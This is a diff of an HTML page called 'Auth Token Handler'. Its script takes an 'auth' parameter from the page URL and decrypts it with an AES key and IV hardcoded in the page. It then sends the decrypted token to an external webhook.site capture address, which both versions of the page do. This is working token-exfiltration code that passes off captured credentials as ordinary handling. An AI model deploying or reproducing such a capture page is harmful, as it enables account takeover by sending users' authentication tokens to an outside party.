@@ -3,35 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auth Logger</title>
+    <title>Auth Token Handler</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        #log {
+            background-color: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            min-height: 200px;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
 </head>
 <body>
+    <h1>Auth Token Handler</h1>
     <pre id="log"></pre>
+
     <script>
-        const log = (m) => document.getElementById('log').textContent += m + "\n";
-        const params = new URLSearchParams(window.location.search);
-        const auth = params.get("auth");
-        if (auth) {
-            log("auth parameter detected: " + auth);
-            // Remove the first character of the auth param
-            const modifiedAuth = auth.slice(1);
-            // Construct the URL with /c=modifiedAuth
-            const url = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${modifiedAuth}`;
-            // Send a GET request to the URL
-            fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        log("Request sent successfully to: " + url);
-                    } else {
-                        log("Failed to send request: " + response.status);
-                    }
-                })
-                .catch(error => {
-                    log("Error sending request: " + error);
-                });
-        } else {
-            log("No auth parameter present.");
+        const log = (m) => {
+            document.getElementById('log').textContent += m + "\n";
+        };
+
+        // Base64 to ArrayBuffer helper
+        function base64ToArrayBuffer(base64) {
+            const binaryString = atob(base64);
+            const bytes = new Uint8Array(binaryString.length);
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            return bytes.buffer;
         }
+
+        // String to ArrayBuffer helper
+        function stringToArrayBuffer(str) {
+            const encoder = new TextEncoder();
+            return encoder.encode(str);
+        }
+
+        // ArrayBuffer to String helper
+        function arrayBufferToString(buffer) {
+            const decoder = new TextDecoder();
+            return decoder.decode(buffer);
+        }
+
+        // Decrypt token function (JavaScript version of your Python function)
+        async function decryptToken(aesKey, ivStr, encrypted) {
+            try {
+                // Reverse the replacement
+                const combined = encrypted.replace(/\*c4l\*/g, "/");
+                log("After replacing *c4l* with /: " + combined);
+                
+                // Split by space
+                const parts = combined.split(" ");
+                if (parts.length !== 2) {
+                    throw new Error("Invalid encrypted format: expected ciphertext and tag separated by space");
+                }
+                
+                const [encCt, encTag] = parts;
+                log("Ciphertext (base64): " + encCt);
+                log("Tag (base64): " + encTag);
+                
+                // Base64 decode
+                const ciphertext = base64ToArrayBuffer(encCt);
+                const tag = base64ToArrayBuffer(encTag);
+                
+                // Combine ciphertext and tag
+                const ctTag = new Uint8Array(ciphertext.byteLength + tag.byteLength);
+                ctTag.set(new Uint8Array(ciphertext), 0);
+                ctTag.set(new Uint8Array(tag), ciphertext.byteLength);
+                
+                // Convert key and IV to ArrayBuffer
+                const keyBytes = stringToArrayBuffer(aesKey);
+                const ivBytes = stringToArrayBuffer(ivStr);
+                
+                // Import the key
+                const cryptoKey = await crypto.subtle.importKey(
+                    'raw',
+                    keyBytes,
+                    { name: 'AES-GCM' },
+                    false,
+                    ['decrypt']
+                );
+                
+                // Decrypt
+                const plaintext = await crypto.subtle.decrypt(
+                    {
+                        name: 'AES-GCM',
+                        iv: ivBytes,
+                        tagLength: 128 // 16 bytes * 8 bits
+                    },
+                    cryptoKey,
+                    ctTag
+                );
+                
+                return arrayBufferToString(plaintext);
+            } catch (error) {
+                log("Decryption error: " + error.message);
+                throw error;
+            }
+        }
+
+        // Main execution
+        async function main() {
+            const params = new URLSearchParams(window.location.search);
+            const auth = params.get("auth");
+
+            if (auth) {
+                log("Auth parameter detected: " + auth);
+                
+                // Remove first character
+                let modifiedAuth = auth.substring(1);
+                log("After removing first char: " + modifiedAuth);
+                
+                // Replace %20 with space
+                modifiedAuth = modifiedAuth.replace(/%20/g, " ");
+                log("After replacing %20 with space: " + modifiedAuth);
+                
+                // Decrypt the token
+                const aesKey = "ad5381fdfee6c65bab7789c1218b0e9b";
+                const ivStr = "4d35d223ad003c76";
+                
+                try {
+                    const decryptedToken = await decryptToken(aesKey, ivStr, modifiedAuth);
+                    log("Decrypted token: " + decryptedToken);
+                    
+                    // Construct webhook URL with decrypted token
+                    const webhookUrl = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${encodeURIComponent(decryptedToken)}`;
+                    log("Sending request to: " + webhookUrl);
+                    
+                    // Send request
+                    const response = await fetch(webhookUrl);
+                    log("Request sent successfully!");
+                    log("Status: " + response.status);
+                    
+                    const data = await response.text();
+                    log("Response: " + data);
+                } catch (error) {
+                    log("Error: " + error.message);
+                }
+            } else {
+                log("No auth parameter present.");
+                log("Usage: Add ?auth=YOUR_ENCRYPTED_TOKEN to the URL");
+            }
+        }
+
+        // Run main function
+        main();
     </script>
 </body>
 </html>
